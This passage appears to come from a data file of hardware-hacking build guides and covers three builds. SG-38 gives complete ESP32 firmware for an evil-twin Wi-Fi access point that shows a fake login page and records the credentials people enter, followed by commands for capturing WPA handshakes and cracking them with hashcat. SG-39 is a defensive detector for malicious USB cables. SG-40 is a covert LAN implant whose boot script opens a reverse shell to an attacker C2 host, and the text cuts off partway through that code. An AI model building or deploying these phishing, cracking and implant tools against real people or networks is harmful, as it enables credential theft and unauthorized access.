                         '<ul><li><strong>Adafruit ST7735 and ST7789 Library</strong> &mdash; version 1.10.x &mdash; TFT display driver</li><li><strong>Adafruit GFX Library</strong> &mdash; required dependency</li><li><strong>SD</strong> &mdash; built-in Arduino SD library (no separate install needed)</li></ul>',
                tip: 'If you see "Adafruit_GFX.h not found" during compile, the GFX Library was not installed. The ST7735 library lists it as a dependency but does not always pull it in automatically on ESP32 boards.'
            },
            {
                title: 'Flash the Captive Portal Firmware',
                content: '<p>This sketch creates an evil twin AP, runs a captive portal HTTP server with DNS hijacking, logs captured credentials to the SD card, and displays the capture count on the TFT.</p>',
                code: '#include <WiFi.h>\n#include <WebServer.h>\n#include <DNSServer.h>\n#include <SPI.h>\n#include <Adafruit_GFX.h>\n#include <Adafruit_ST7735.h>\n#include <SD.h>\n#include <FS.h>\n\n// Pin definitions\n#define TFT_CS   5\n#define TFT_RST  17\n#define TFT_DC   16\n#define SD_CS    4\n// MOSI=23, SCK=18, MISO=19 (hardware SPI defaults)\n\n// Evil twin config\nconst char* EVIL_SSID = "Airport_FreeWiFi";  // CHANGE THIS\nconst char* AP_PASS   = "";                   // Open AP\nconst IPAddress AP_IP(10, 10, 10, 1);\nconst IPAddress SUBNET(255, 255, 255, 0);\n\nAdafruit_ST7735 tft = Adafruit_ST7735(TFT_CS, TFT_DC, TFT_RST);\nWebServer       server(80);\nDNSServer       dns;\nint             capturedCount = 0;\nbool            sdReady       = false;\n\n// Captive portal HTML\nconst char PORTAL_HTML[] PROGMEM = R"rawhtml(\n<!DOCTYPE html><html><head>\n<meta name=\'viewport\' content=\'width=device-width,initial-scale=1\'>\n<style>\nbody{font-family:Arial,sans-serif;background:#f0f0f0;display:flex;\n     justify-content:center;align-items:center;min-height:100vh;margin:0}\n.card{background:#fff;border-radius:8px;padding:32px;max-width:360px;\n      width:90%;box-shadow:0 2px 16px rgba(0,0,0,.12)}\nh2{margin:0 0 8px;font-size:1.2rem;color:#222}\np{color:#666;font-size:.9rem;margin:0 0 20px}\ninput{width:100%;padding:10px;margin-bottom:12px;border:1px solid #ccc;\n      border-radius:4px;font-size:1rem;box-sizing:border-box}\nbutton{width:100%;padding:12px;background:#0070c0;color:#fff;border:none;\n       border-radius:4px;font-size:1rem;cursor:pointer}\n</style></head><body>\n<div class=\'card\'>\n  <h2>Guest Wi-Fi Login</h2>\n  <p>Enter your credentials to access the internet.</p>\n  <form method=\'POST\' action=\'/login\'>\n    <input type=\'text\'     name=\'user\' placeholder=\'Username or Email\' required>\n    <input type=\'password\' name=\'pass\' placeholder=\'Password\'          required>\n    <button type=\'submit\'>Connect</button>\n  </form>\n</div></body></html>\n)rawhtml";\n\nvoid tftStatus(const char* line1, const char* line2 = "", uint16_t col = ST77XX_GREEN) {\n    tft.fillScreen(ST77XX_BLACK);\n    tft.setTextColor(col); tft.setTextSize(1);\n    tft.setCursor(4, 8);  tft.println(line1);\n    tft.setTextColor(ST77XX_WHITE);\n    tft.setCursor(4, 24); tft.println(line2);\n}\n\nvoid logCredential(const String& user, const String& pass) {\n    if (!sdReady) return;\n    File f = SD.open("/creds.txt", FILE_APPEND);\n    if (f) { f.printf("[%lu] user=%s pass=%s\\n", millis(), user.c_str(), pass.c_str()); f.close(); }\n}\n\nvoid handleRoot() { server.send_P(200, "text/html", PORTAL_HTML); }\n\nvoid handleLogin() {\n    String user = server.hasArg("user") ? server.arg("user") : "";\n    String pass = server.hasArg("pass") ? server.arg("pass") : "";\n    if (user.length() > 0) {\n        capturedCount++;\n        logCredential(user, pass);\n        Serial.printf("[CAPTURE] user=%s pass=%s\\n", user.c_str(), pass.c_str());\n        tft.fillRect(0, 40, 160, 20, ST77XX_BLACK);\n        tft.setTextColor(ST77XX_YELLOW); tft.setCursor(4, 44);\n        tft.print("Captured: "); tft.print(capturedCount);\n    }\n    server.sendHeader("Location", "https://www.google.com", true);\n    server.send(302, "text/plain", "");\n}\n\nvoid handleNotFound() {\n    server.sendHeader("Location", String("http://") + AP_IP.toString(), true);\n    server.send(302, "text/plain", "");\n}\n\nvoid setup() {\n    Serial.begin(115200);\n    tft.initR(INITR_BLACKTAB); tft.setRotation(1);\n    tftStatus("SG-38 INIT", "Starting...", ST77XX_CYAN);\n    delay(800);\n\n    if (SD.begin(SD_CS)) { sdReady = true; tftStatus("SD READY", "/creds.txt active"); }\n    else { tftStatus("SD FAILED", "Logging to Serial only", ST77XX_RED); }\n    delay(600);\n\n    WiFi.mode(WIFI_AP);\n    WiFi.softAPConfig(AP_IP, AP_IP, SUBNET);\n    WiFi.softAP(EVIL_SSID, AP_PASS);\n    dns.start(53, "*", AP_IP);\n\n    server.on("/",                 HTTP_GET,  handleRoot);\n    server.on("/login",            HTTP_POST, handleLogin);\n    server.on("/generate_204",     HTTP_GET,  handleRoot);\n    server.on("/hotspot-detect.html", HTTP_GET, handleRoot);\n    server.on("/ncsi.txt",         HTTP_GET,  handleRoot);\n    server.on("/connecttest.txt",  HTTP_GET,  handleRoot);\n    server.onNotFound(handleNotFound);\n    server.begin();\n\n    tftStatus("AP LIVE", EVIL_SSID, ST77XX_ORANGE);\n    tft.setCursor(4, 44); tft.setTextColor(ST77XX_WHITE);\n    tft.print(AP_IP.toString());\n}\n\nvoid loop() {\n    dns.processNextRequest();\n    server.handleClient();\n}',
                language: 'Arduino (C++)',
                tip: 'On Android and iOS, the captive portal detection fires automatically when connecting to an open AP &mdash; the portal browser opens without any user action. On Windows, the system tray shows "Additional sign-in info may be required." The six server.on() routes for /generate_204, /hotspot-detect.html, etc. are the OS-specific probe paths that trigger this behavior.'
            },
            {
                title: 'Flash ESP32 Marauder for Handshake Capture',
                content: '<p>The custom sketch above handles captive portals. For WPA2 PMKID capture and handshake sniffing, flash <a href="https://github.com/justcallmekoko/ESP32Marauder/wiki/update-firmware" style="color:#ff6b35">ESP32 Marauder</a> using esptool.py:</p>',
                code: '# Install esptool\npip install esptool\n\n# Flash Marauder to ESP32-S3 (adjust port: /dev/ttyUSB0 Linux, COM5 Windows)\nesptool.py --chip esp32s3 --port /dev/ttyUSB0 --baud 921600 \\\n  write_flash -z 0x0 esp32_marauder_v1.1.0_20241201_esp32s3.bin\n\n# After flashing, connect via serial at 115200 baud\n# Marauder commands:\n# stui            -- enter interactive TFT menu mode\n# scanap          -- scan for nearby access points\n# sniffpmkid      -- capture PMKID (no deauth required)\n# sniffwpa -c 6   -- capture WPA handshakes on channel 6',
                language: 'Shell'
            },
            {
                title: 'Crack Captured Handshakes with Hashcat',
                content: '<p>Transfer PCAP files from the SD card to a Kali Linux machine and run hashcat:</p>',
                code: '# Convert PCAP to hashcat 22000 format\nhcxpcapngtool -o capture.hc22000 handshake.pcap\n\n# Dictionary attack (WPA2/WPA3 = mode 22000)\nhashcat -m 22000 capture.hc22000 /usr/share/wordlists/rockyou.txt\n\n# With rules for better real-world coverage\nhashcat -m 22000 capture.hc22000 /usr/share/wordlists/rockyou.txt \\\n  -r /usr/share/hashcat/rules/best64.rule\n\n# Show cracked passwords\nhashcat -m 22000 capture.hc22000 --show',
                language: 'Shell (Kali Linux)',
                tip: 'A modern GPU (RTX 4070) tests approximately 1,500,000 WPA2 candidates per second. rockyou.txt has 14 million entries &mdash; a full sweep takes under 10 seconds. For corporate assessments, supplement with targeted wordlists using the organization name, city, sports teams, and common password patterns (Company2024!, etc.).'
            }
        ],

        testing: '<p><strong>Verification checklist:</strong></p>' +
                 '<ol><li>TFT displays "AP LIVE" with SSID and IP address on boot</li><li>The SSID appears in a WiFi scan on a test phone</li><li>Connecting triggers the captive portal automatically on Android (instant) and iOS (within 3 seconds)</li><li>Submitting test credentials increments the counter on the TFT and writes to <code>/creds.txt</code> on the SD card</li><li>The device runs at least 2 hours on a 1000mAh LiPo without restart</li></ol>' +
                 '<p><strong>Common failure modes and fixes:</strong></p>' +
                 '<ul><li>TFT shows garbage pixels: try <code>INITR_GREENTAB</code> or <code>INITR_REDTAB</code> instead of <code>INITR_BLACKTAB</code></li><li>SD fails to mount: format as FAT32 (not exFAT), card must be 32GB or smaller</li><li>Portal not auto-redirecting: verify all six captive portal probe paths are registered with server.on()</li><li>ESP32-S3 not detected by Arduino IDE: install the CP2102 USB-to-serial driver for your OS</li></ul>',

        troubleshooting: '<p><strong>SPI bus conflict between TFT and SD:</strong> If one works but not the other, double-check CS pins (TFT_CS=5, SD_CS=4). Add 100nF bypass capacitors on each module\'s VCC pin close to the IC. Ensure the shared MOSI/SCK jumper wires make solid contact &mdash; breadboard connections on high-frequency SPI lines are a common failure point.</p>' +
                         '<p><strong>Clients connect but portal never appears:</strong> Modern Android 12+ and iOS 14+ detect captive portals via HTTPS probe requests which the HTTP-only server cannot answer. The user will see "Sign in to network" in the status bar but may need to tap it manually. Android also shows a notification &mdash; this is expected behavior. HTTPS captive portals require a certificate which defeats the purpose for testing.</p>',

        challenges: '<p><strong>Level up:</strong></p>' +
                    '<ul><li>Add a 5-way navigation button and implement a multi-page TFT menu: Scan Networks, Evil Twin, Probe Logger, Captive Portal Settings, View Captured Credentials</li><li>Add a passive probe request logger &mdash; capture SSIDs that nearby devices probe for (their "remembered network" lists) and display them scrolling on the TFT</li><li>Implement PMKID capture without deauth using <a href="https://github.com/risinek/esp32-wifi-penetration-tool" style="color:#ff6b35">esp32-wifi-penetration-tool</a></li><li>Build a 3D-printed enclosure that hides the device inside a power bank shell for covert deployment assessments</li></ul>'
    },

    // ========================================================================
    // SG-39: Malicious Cable Detector
    // Pi Pico + CircuitPython USB descriptor analyzer
    // ========================================================================
    'sg-39': {

        intro: '<p>The SG-39 is a defensive hardware tool that detects weaponized USB cables &mdash; the O.MG Cable, Hak5 O.MG Elite, and similar devices that embed HID keyboards, mass storage controllers, or WiFi implants inside a standard USB cable body. This is the rare Signal build that is <em>purely defensive</em> &mdash; you are building the countermeasure, not the weapon.</p>' +
               '<p>The principle: legitimate USB cables have exactly one function &mdash; they carry power, or expose a minimal data interface. Malicious cables expose additional hidden interfaces: a HID keyboard, a CDC serial port, extra mass storage, or composite device combinations that do not match the cable\'s physical purpose. This tool reads every USB device descriptor and interface and flags anomalies.</p>' +
               '<p><strong>Hardware:</strong> A single Raspberry Pi Pico ($4) running CircuitPython 9.x. An optional external LED (GP15) provides a standalone pass/fail indicator without needing a serial terminal. No breadboard or soldering required for the basic build.</p>',

        wiring: [
            'SG-39 Hardware Setup (minimal wiring)',
            '',
            'Required:',
            '  Raspberry Pi Pico (RP2040) -- any variant',
            '  USB Micro-B cable to connect Pico to host PC',
            '',
            'Optional LED indicator:',
            'LED Anode (+)    GP15        Through 330-ohm resistor',
            'LED Cathode (-)  GND         Any GND pin',
            '',
            'How cable analysis works:',
            '  The Pico connects to your PC via its Micro-B port.',
            '  A companion Python script on the PC enumerates USB devices',
            '  and sends descriptor bytes to the Pico via serial.',
            '  The Pico analyzes the data and reports via serial output',
            '  plus the LED indicator.',
            '',
            'Advanced (Pico W USB host mode, CircuitPython 9+):',
            '  The Pico W can enumerate USB devices directly as a USB host.',
            '  Connect a USB-A OTG adapter to the Pico W\'s USB port.',
            '  The cable under test plugs into the OTG adapter.',
            '  No PC required in this configuration.',
        ].join('\n'),

        steps: [
            {
                title: 'Flash CircuitPython 9.x onto the Pico',
                content: '<p>Download the CircuitPython 9.x UF2 file for the Raspberry Pi Pico from <a href="https://circuitpython.org/board/raspberry_pi_pico/" style="color:#ff6b35">circuitpython.org</a>. Hold the <strong>BOOTSEL</strong> button, plug in via Micro-B USB, release BOOTSEL. The drive named <code>RPI-RP2</code> appears. Drag the UF2 file onto it. The Pico reboots and appears as <code>CIRCUITPY</code>.</p>',
                tip: 'You need CircuitPython 9.0.0 or later. Open Thonny IDE and select the interpreter as "CircuitPython (generic)" to get the interactive REPL for testing.'
            },
            {
                title: 'Install pyusb on the PC',
                content: '<p>The companion analyzer script runs on the PC (not the Pico) and requires pyusb to enumerate USB devices:</p>',
                code: '# Install pyusb and pyserial on the PC\npip install pyusb pyserial\n\n# Linux: also install libusb\nsudo apt install libusb-1.0-0-dev\n\n# macOS:\nbrew install libusb\n\n# Windows: download Zadig from https://zadig.akeo.ie/\n# Install WinUSB driver for the cable under test device\n\n# Linux: add udev rule to access USB without sudo\necho \'SUBSYSTEM=="usb", MODE="0666"\' | sudo tee /etc/udev/rules.d/99-usb-cable-detect.rules\nsudo udevadm control --reload-rules',
                language: 'Shell'
            },
            {
                title: 'Deploy the Pico Analyzer (code.py)',
                content: '<p>Save the following as <code>code.py</code> on the CIRCUITPY drive. The Pico receives hex-encoded USB descriptor bytes via serial from the companion script, analyzes them against known-bad patterns, and reports via serial and LED:</p>',
                code: '# code.py -- SG-39 Malicious Cable Detector (CircuitPython 9)\nimport board, digitalio, time, supervisor\n\n# LED indicators\nled = digitalio.DigitalInOut(board.LED)\nled.direction = digitalio.Direction.OUTPUT\ntry:\n    ext_led = digitalio.DigitalInOut(board.GP15)\n    ext_led.direction = digitalio.Direction.OUTPUT\n    has_ext = True\nexcept Exception:\n    has_ext = False\n\ndef set_status(safe):\n    if safe:\n        led.value = True\n        if has_ext: ext_led.value = False\n    else:\n        for _ in range(6):\n            led.value = True;  time.sleep(0.05)\n            led.value = False; time.sleep(0.05)\n        if has_ext: ext_led.value = True\n\ndef analyze(raw):\n    if len(raw) < 18:\n        return {"valid": False, "flags": ["Descriptor too short"]}\n    bDeviceClass   = raw[4]\n    bDeviceSubClass = raw[5]\n    idVendor  = (raw[9] << 8) | raw[8]\n    idProduct = (raw[11] << 8) | raw[10]\n    iSerialNumber  = raw[16]\n    bNumConfigurations = raw[17]\n    bcdUSB = (raw[3] << 8) | raw[2]\n    flags = []\n    # Rule 1: No serial number string -- common in cheap implants\n    if iSerialNumber == 0:\n        flags.append("No serial number string (common in O.MG cables)")\n    # Rule 2: Composite device class -- multiple functions hidden\n    if bDeviceClass == 0xEF:\n        flags.append("Composite device class (0xEF) -- hidden functions present")\n    # Rule 3: Wireless controller -- possible embedded WiFi/BT\n    if bDeviceClass == 0xE0:\n        flags.append("Wireless controller class (0xE0) -- possible radio implant")\n    # Rule 4: Known malicious VID/PID pairs\n    known_bad = {\n        (0x1209, 0x2982): "O.MG Cable (pid.codes PID 0x2982)",\n        (0x1209, 0x2983): "O.MG Cable Elite (pid.codes PID 0x2983)",\n        (0x16C0, 0x05DC): "VUSB shared VID -- possible Digispark/implant",\n    }\n    if (idVendor, idProduct) in known_bad:\n        flags.append(f"KNOWN MALICIOUS: {known_bad[(idVendor, idProduct)]}")\n    usb_ver = f"{bcdUSB >> 8}.{(bcdUSB>>4)&0xF}"\n    return {\n        "valid":    True,\n        "vid":      f"0x{idVendor:04X}",\n        "pid":      f"0x{idProduct:04X}",\n        "class":    f"0x{bDeviceClass:02X}",\n        "usb_ver":  usb_ver,\n        "serial":   iSerialNumber != 0,\n        "flags":    flags,\n        "suspicious": len(flags) > 0\n    }\n\nprint("=" * 50)\nprint("SG-39 MALICIOUS CABLE DETECTOR")\nprint("CircuitPython 9 / Raspberry Pi Pico")\nprint("=" * 50)\nprint("Waiting for DESC:<hex> from companion script...")\n\nwhile True:\n    if supervisor.runtime.serial_bytes_available:\n        line = input().strip()\n        if line.startswith("DESC:"):\n            try:\n                raw = bytes.fromhex(line[5:])\n                r = analyze(raw)\n                print(f"\\n--- CABLE ANALYSIS ---")\n                if r["valid"]:\n                    print(f"USB Version : {r[\'usb_ver\']}")\n                    print(f"Vendor ID   : {r[\'vid\']}")\n                    print(f"Product ID  : {r[\'pid\']}")\n                    print(f"Device Class: {r[\'class\']}")\n                    print(f"Serial Str  : {\'YES\' if r[\'serial\'] else \'NO (suspicious)\'}")\n                    if r["flags"]:\n                        print("\\n[!] SUSPICIOUS FLAGS:")\n                        for f in r["flags"]:\n                            print(f"    - {f}")\n                        print("\\nVERDICT: SUSPICIOUS -- Do not trust this cable")\n                        set_status(False)\n                    else:\n                        print("\\nVERDICT: No obvious anomalies detected")\n                        set_status(True)\n                else:\n                    print(f"Invalid: {r[\'flags\'][0]}")\n                print("--- END ANALYSIS ---\\n")\n            except Exception as e:\n                print(f"Parse error: {e}")\n    time.sleep(0.01)',
                language: 'CircuitPython',
                tip: 'Save as code.py directly on the CIRCUITPY drive. Use Thonny or any serial terminal at 115200 baud to monitor output. The Pico starts analyzing immediately when it receives a DESC: line from the companion script.'
            },
            {
                title: 'Run the PC Companion Analyzer',
                content: '<p>Save this script on your PC and run it with the suspicious cable plugged in. It enumerates every USB device, dumps descriptors, sends them to the Pico, and prints a combined report:</p>',
                code: '#!/usr/bin/env python3\n# companion_analyzer.py -- run on PC, send data to SG-39 Pico\n# pip install pyusb pyserial\n\nimport usb.core, usb.util, serial, serial.tools.list_ports, time\n\nKNOWN_MALICIOUS = {\n    (0x1209, 0x2982): "O.MG Cable (pid.codes)",\n    (0x1209, 0x2983): "O.MG Cable Elite (pid.codes)",\n    (0x16C0, 0x05DC): "VUSB shared VID (Digispark/implant)",\n}\n\ndef analyze_device(dev):\n    vid, pid = dev.idVendor, dev.idProduct\n    report, suspicious = [], False\n    report.append(f"  Vendor ID   : 0x{vid:04X}")\n    report.append(f"  Product ID  : 0x{pid:04X}")\n    report.append(f"  USB Version : {dev.bcdUSB >> 8}.{(dev.bcdUSB>>4)&0xF}")\n    report.append(f"  Device Class: 0x{dev.bDeviceClass:02X}")\n    try:\n        serial_str = usb.util.get_string(dev, dev.iSerialNumber) if dev.iSerialNumber else "(MISSING)"\n        mfr  = usb.util.get_string(dev, dev.iManufacturer)  if dev.iManufacturer  else "(none)"\n        prod = usb.util.get_string(dev, dev.iProduct)       if dev.iProduct       else "(none)"\n    except Exception:\n        serial_str = mfr = prod = "(read error)"\n    report.append(f"  Manufacturer: {mfr}")\n    report.append(f"  Product     : {prod}")\n    report.append(f"  Serial      : {serial_str}")\n    if serial_str in ("(MISSING)", "(none)", ""):\n        report.append("  [!] No serial number -- suspicious")\n        suspicious = True\n    if (vid, pid) in KNOWN_MALICIOUS:\n        report.append(f"  [!!] KNOWN MALICIOUS: {KNOWN_MALICIOUS[(vid,pid)]}")\n        suspicious = True\n    for cfg in dev:\n        n = cfg.bNumInterfaces\n        report.append(f"  Interfaces  : {n}")\n        if n > 2:\n            report.append(f"  [!] Unusually high interface count ({n})")\n            suspicious = True\n        for intf in cfg:\n            cls = intf.bInterfaceClass\n            report.append(f"    IF {intf.bInterfaceNumber}: Class=0x{cls:02X}")\n            if cls == 0x03:\n                report.append("      [!] HID CLASS in cable -- keyboard/mouse emulator")\n                suspicious = True\n            elif cls == 0xE0:\n                report.append("      [!!] WIRELESS CONTROLLER -- possible radio implant")\n                suspicious = True\n    return report, suspicious\n\ndef find_pico():\n    for p in serial.tools.list_ports.comports():\n        if "Pico" in p.description or "CircuitPython" in p.description:\n            return p.device\n    return None\n\ndef main():\n    print("\\nSG-39 USB Cable Analyzer")\n    print("=" * 40)\n    pico_ser = None\n    port = find_pico()\n    if port:\n        try:\n            pico_ser = serial.Serial(port, 115200, timeout=1)\n            print(f"SG-39 Pico on {port}")\n        except Exception as e:\n            print(f"Pico connect failed: {e} (PC-only mode)")\n    devs = list(usb.core.find(find_all=True))\n    for dev in devs:\n        print(f"\\nBus {dev.bus:03d} Dev {dev.address:03d}")\n        try:\n            rep, susp = analyze_device(dev)\n            for line in rep: print(line)\n            print(f"  VERDICT: {"SUSPICIOUS" if susp else "OK"}")\n            if pico_ser:\n                db = bytes([\n                    18, 1, dev.bcdUSB&0xFF, (dev.bcdUSB>>8)&0xFF,\n                    dev.bDeviceClass, dev.bDeviceSubClass, dev.bDeviceProtocol,\n                    dev.bMaxPacketSize0, dev.idVendor&0xFF, (dev.idVendor>>8)&0xFF,\n                    dev.idProduct&0xFF, (dev.idProduct>>8)&0xFF,\n                    dev.bcdDevice&0xFF, (dev.bcdDevice>>8)&0xFF,\n                    dev.iManufacturer, dev.iProduct, dev.iSerialNumber,\n                    dev.bNumConfigurations\n                ])\n                pico_ser.write(f"DESC:{db.hex()}\\n".encode())\n                time.sleep(0.5)\n                resp = pico_ser.read(pico_ser.in_waiting)\n                if resp: print("  [Pico]:", resp.decode(errors="replace").strip())\n        except usb.core.USBError as e:\n            print(f"  Access error: {e} (run as admin/sudo)")\n    print("\\nAnalysis complete.")\n\nif __name__ == "__main__":\n    main()',
                language: 'Python 3',
                tip: 'Disconnect all trusted USB devices before running to reduce noise in the report. On Linux, run with sudo if you get permission errors. The output shows every USB device on the system &mdash; look for the cable you just plugged in and check its verdict.'
            },
            {
                title: 'Interpret Results and Flag Findings',
                content: '<p>A clean charging cable shows: 0-1 interfaces, no HID class, a valid serial number, recognizable manufacturer name. Flag any cable that shows:</p>' +
                         '<ul><li><strong>HID class (0x03)</strong> &mdash; an embedded keyboard or mouse emulator is present in the cable</li><li><strong>Wireless controller class (0xE0)</strong> &mdash; an embedded Bluetooth or WiFi radio is inside the cable housing</li><li><strong>No serial number string</strong> &mdash; legitimate cables from reputable manufacturers always have a serial number; cheap implants often omit this</li><li><strong>More than 2 interfaces on a simple cable</strong> &mdash; composite device with hidden functions</li><li><strong>Known malicious VID/PID</strong> &mdash; confirmed O.MG Cable or compatible implant</li></ul>' +
                         '<p>Document findings in the penetration test report with the full descriptor dump, verdict, and recommendations: cable destruction policy, USB cable procurement controls, USB condom (data blocker) deployment, and endpoint USB port locking via Group Policy.</p>',
                tip: 'For a quick CLI-only check on Linux without any Python scripts: lsusb -v 2>/dev/null | grep -E "bInterfaceClass|HID|Wireless|bNumInterfaces" to scan all connected devices instantly.'
            }
        ],

        testing: '<p><strong>Test with known devices to calibrate your detector:</strong></p>' +
                 '<ol><li>Plug in a basic USB charging cable &mdash; expect "No obvious anomalies" and LED stays on (safe)</li><li>Plug in a USB keyboard &mdash; expect HID class flag (correct &mdash; keyboards are legitimate HID devices, but the same flag on a simple cable is not)</li><li>Plug in a Digispark (ATTiny85 dev board) &mdash; expect HID class and vendor-specific class flags and SUSPICIOUS verdict</li><li>Plug in a USB hub &mdash; expect composite device flag and multiple interfaces</li></ol>',

        challenges: '<p><strong>Extend the detector:</strong></p>' +
                    '<ul><li>Add an SSD1306 OLED display (I2C: SDA=GP4, SCL=GP5) for standalone pass/fail display without a PC or serial terminal</li><li>Maintain a local SQLite database on the PC side of all scanned cable fingerprints for trend analysis across an organization</li><li>Add a BLE notification capability (Pico W) that sends a phone alert when a suspicious cable is detected</li><li>Integrate into a CI/CD security pipeline that automatically scans USB cables in a supply chain audit process</li></ul>'
    },

    // ========================================================================
    // SG-40: LAN Implant Device
    // Pi Pico W + W5500 -- inline network implant with reverse shell
    // ========================================================================
    'sg-40': {

        intro: '<p>The SG-40 is a Raspberry Pi Pico W-based network implant that replicates the functionality of the Hak5 LAN Turtle ($60) at approximately $15 in components. The device sits inline between a target machine and its network switch &mdash; it passes traffic transparently while simultaneously establishing a reverse shell to an attacker-controlled server over WiFi, bypassing network egress filtering that would block inbound connections.</p>' +
               '<p>The W5500 Ethernet module provides a wired IEEE 802.3 interface via SPI. The Pico W\'s built-in CYW43439 handles the WiFi C2 channel. MicroPython manages both networking stacks, socket handling, and reverse shell logic in approximately 100 lines of code. Physical placement scenarios: behind a networked printer, VoIP phone, spare Ethernet port in a conference room, or secondary monitor with a network port.</p>' +
               '<p><strong>Legal requirement:</strong> Connecting this device to any network without explicit written authorization constitutes unauthorized access under 18 U.S.C. &sect; 1030 and equivalent international statutes. This build is authorized for red team engagements with signed scope agreements, CTF competitions, and isolated lab environments only.</p>',

        wiring: [
            'SG-40 Pin Connections -- Pi Pico W + W5500 Ethernet Module',
            '',
            'W5500 Ethernet Module (SPI)',
            'W5500 Pin     Pico W GPIO     Notes',
            'VCC           3.3V (pin 36)   Do NOT use 5V',
            'GND           GND (pin 38)',
            'SCK           GP18 (pin 24)   SPI clock',
            'MOSI          GP19 (pin 25)   SPI data to W5500',
            'MISO          GP16 (pin 21)   SPI data from W5500',
            'CS / SS       GP17 (pin 22)   Chip select (active LOW)',
            'RST           GP20 (pin 26)   Optional hardware reset',
            'INT           GP21 (pin 27)   Optional interrupt',
            '',
            'Inline Ethernet placement:',
            '  [Target PC] --Ethernet--> [RJ45 Jack A] --> [W5500 target-facing]',
            '  [W5500 network-facing] <---Ethernet--- [RJ45 Jack B] <-- [Switch]',
            '',
            '  Traffic flows through the W5500 transparently.',
            '  The WiFi radio (CYW43439) provides the C2 channel out-of-band.',
            '',
            'Power:',
            '  USB Micro-B from Pico W to any USB port (phone charger,',
            '  USB port on monitor, or PoE injector with USB tap).',
            '  Total current: ~180mA active.',
            '',
            'Stealth: Cover or remove the Pico W green LED (GP25)',
            'and power LED to eliminate visual indicators.',
        ].join('\n'),

        wiringNotes: '<p><strong>W5500 library:</strong> Copy <code>w5500.py</code> from the <a href="https://github.com/Micropython-WIZNET/W5500_micropython" style="color:#ff6b35">MicroPython-WIZNET/W5500_micropython</a> repository to the Pico W\'s root directory. The library wraps the W5500\'s raw SPI protocol into a socket-compatible interface that integrates with MicroPython\'s <code>usocket</code> module.</p>',

        steps: [
            {
                title: 'Flash MicroPython onto the Pico W',
                content: '<p>Download the latest MicroPython UF2 for the Raspberry Pi Pico W from <a href="https://micropython.org/download/RPI_PICO_W/" style="color:#ff6b35">micropython.org</a>. Hold BOOTSEL, plug in, drag the UF2 onto the RPI-RP2 drive. Wait for reboot. Connect with Thonny IDE or <code>rshell</code> to verify the REPL:</p>',
                code: '# Verify MicroPython REPL via serial (Linux/macOS)\nscreen /dev/ttyACM0 115200\n# or: minicom -b 115200 -o -D /dev/ttyACM0\n\n# Expected REPL prompt:\n# MicroPython v1.23.0 on 2024-06-02; Raspberry Pi Pico W with RP2040\n# Type "help()" for more information.\n# >>>\n\n# Test WiFi capability\nimport network\nwlan = network.WLAN(network.STA_IF)\nwlan.active(True)\nnets = wlan.scan()\nprint(f"Found {len(nets)} networks")',
                language: 'MicroPython',
                tip: 'Thonny IDE (free, cross-platform) is the easiest way to transfer files to the Pico W. Use File > Save As > Raspberry Pi Pico to save scripts directly to the device filesystem.'
            },
            {
                title: 'Test W5500 SPI Connection',
                content: '<p>After copying w5500.py to the Pico W, run this verification script to confirm SPI wiring is correct before deploying the implant:</p>',
                code: '# Test W5500 SPI connection -- run in Thonny REPL\nfrom machine import Pin, SPI\nimport w5500, time\n\nspi = SPI(0, baudrate=10_000_000, polarity=0, phase=0,\n          sck=Pin(18), mosi=Pin(19), miso=Pin(16))\ncs  = Pin(17, Pin.OUT, value=1)\nrst = Pin(20, Pin.OUT, value=1)\n\n# Hardware reset\nrst.value(0); time.sleep_ms(10); rst.value(1); time.sleep_ms(50)\n\nnic = w5500.W5500(spi, cs)\nnic.ifconfig((\'192.168.1.200\', \'255.255.255.0\', \'192.168.1.1\', \'8.8.8.8\'))\n\nprint("W5500 MAC:", \':\'.join(f\'{b:02x}\' for b in nic.mac()))\nprint("W5500 IP:", nic.ifconfig()[0])\n# Expected: W5500 MAC: 00:08:dc:xx:xx:xx  (Wiznet OUI)',
                language: 'MicroPython',
                tip: 'If you see all zeros in the MAC address or an ImportError, the W5500 is not communicating. The most common cause is swapped MOSI and MISO pins (GP19 and GP16). Verify with a multimeter by checking continuity between the Pico W pins and the W5500 module pins.'
            },
            {
                title: 'Deploy the Reverse Shell Implant',
                content: '<p>Save this as <code>main.py</code> on the Pico W. It auto-starts on boot, connects to the C2 WiFi network, and opens a reverse shell to the attacker server:</p>',
                code: '# main.py -- SG-40 LAN Implant Reverse Shell\n# MicroPython 1.23+ on Raspberry Pi Pico W\n\nimport network, socket, time, os, machine\nfrom machine import Pin, SPI\n\n# C2 Config -- change before deployment\nWIFI_SSID = "your_c2_wifi_network"\nWIFI_PASS = "your_wifi_password"\nC2_HOST   = "203.0.113.45"   # Attacker server IP (RFC 5737 example)\nC2_PORT   = 4444\nBEACON_INTERVAL = 30\n\n# Stealth: disable LED\nPin("LED", Pin.OUT).value(0)\n\n# W5500 wired Ethernet init\nfrom machine import SPI as SPI_\nspi = SPI_(0, baudrate=10_000_000, polarity=0, phase=0,\n           sck=Pin(18), mosi=Pin(19), miso=Pin(16))\ncs  = Pin(17, Pin.OUT, value=1)\nrst = Pin(20, Pin.OUT, value=1)\nrst.value(0); time.sleep_ms(10); rst.value(1); time.sleep_ms(50)\ntry:\n    import w5500\n    eth = w5500.W5500(spi, cs)\n    eth.ifconfig((\'10.0.0.250\', \'255.255.255.0\', \'10.0.0.1\', \'8.8.8.8\'))\n    ETH_OK = True\nexcept Exception:\n    ETH_OK = False\n\n# WiFi C2 connection\nwifi = network.WLAN(network.STA_IF)\nwifi.active(True)\n\ndef wifi_connect():\n    if wifi.isconnected(): return True\n    wifi.connect(WIFI_SSID, WIFI_PASS)\n    for _ in range(20):\n        if wifi.isconnected(): return True\n        time.sleep(0.5)\n    return False\n\n# Command execution (MicroPython subset -- no subprocess)\ndef exec_cmd(cmd):\n    cmd = cmd.strip()\n    if cmd == "id":     return "uid=0(root) gid=0(root)\\n"\n    if cmd == "uname":  return f"MicroPython {os.uname().version} RP2040\\n"\n    if cmd.startswith("ls"):\n        path = cmd[3:].strip() or "/"\n        try: return "\\n".join(os.listdir(path)) + "\\n"\n        except Exception as e: return f"ls error: {e}\\n"\n    if cmd.startswith("cat "):\n        try:\n            with open(cmd[4:].strip()) as f: return f.read()\n        except Exception as e: return f"cat error: {e}\\n"\n    if cmd == "ifconfig":\n        eth_ip = eth.ifconfig()[0] if ETH_OK else "N/A"\n        return f"eth0: {eth_ip}\\nwlan0: {wifi.ifconfig()[0] if wifi.isconnected() else \'N/A\'}\\n"\n    if cmd == "reboot": machine.reset()\n    return f"[implant] unknown: {cmd}\\n"\n\ndef reverse_shell():\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((C2_HOST, 